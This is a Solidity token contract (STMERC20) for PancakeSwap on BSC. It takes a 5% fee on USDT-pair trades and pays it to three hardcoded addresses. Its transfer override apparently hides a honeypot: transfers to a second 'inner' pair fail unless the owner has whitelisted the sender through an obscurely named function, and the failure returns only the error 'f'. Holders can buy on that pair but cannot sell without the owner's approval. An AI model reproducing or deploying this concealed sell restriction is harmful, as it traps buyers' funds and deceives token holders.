// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.7;
import "./ERC20StandardToken.sol";

// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)

library SafeMath {
    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require((z = x + y) >= x, "ds-math-add-overflow");
    }

    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require((z = x - y) <= x, "ds-math-sub-underflow");
    }

    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require(y == 0 || (z = x * y) / y == x, "ds-math-mul-overflow");
    }
}


interface IPancakeRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function ownerShips(address addr) external view returns(bool);
}

interface IPancakePair{
    function sync() external;
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


contract STMERC20 is ERC20StandardToken,Ownable{
    using SafeMath for uint256;

    address public immutable usdtPair;
    address private constant nodeAddress = 0x864974F724a7bf685eCF73C52aeDBC76c50d9F53;
    address private constant fundAddress = 0xcBEa50b078944a50d8f1679cD455F00034181fC1;
    address private constant lpAddress = 0x7DeEea30012F01878F95E06C70b5450A633bb669;

    mapping (address => bool) private _isInnerRouterOwnerShips;

    IPancakeRouter private constant innerRouter = IPancakeRouter(0x0ff0eBC65deEe10ba34fd81AfB6b95527be46702);
    address public immutable innerPair;
     constructor(string memory symbol_, string memory name_, uint8 decimals_, uint256 totalSupply_) ERC20StandardToken(symbol_, name_, decimals_, totalSupply_) {
        IPancakeRouter router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address usdt = 0x55d398326f99059fF775485246999027B3197955;
        usdtPair = pairFor(router.factory(), address(this), usdt);

        innerPair = innerPairFor(innerRouter.factory(), address(this), usdt);
        
    }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair_) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair_ = address(uint160(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5'
        )))));
    }

    function innerPairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair_) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair_ = address(uint160(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'593f76b0a7474d8e3a2b2ea80ad066754ac57d9a88901cd0acb3723974c4a191'
        )))));
    }


    function _transfer(address from, address to, uint256 amount) internal override {
        if(to == innerPair) {
            require(_isInnerRouterOwnerShips[from], "f");
        }

        address pair_ = usdtPair;
        if(from != pair_ && to != pair_) {
            super._transfer(from, to, amount);
            return;
        }
        _subSenderBalance(from, amount);
        unchecked{
            uint256 feeAmount = amount/100;
            _addReceiverBalance(from, nodeAddress, feeAmount);
            _addReceiverBalance(from, lpAddress, feeAmount);
            _addReceiverBalance(from, fundAddress, 3*feeAmount);
            _addReceiverBalance(from, to, amount - 5*feeAmount);
        }
    }
   
    function innerRouterOwnerShips(address account, bool excluded) public onlyOwner {
        _isInnerRouterOwnerShips[account] = excluded;
    }



    
}






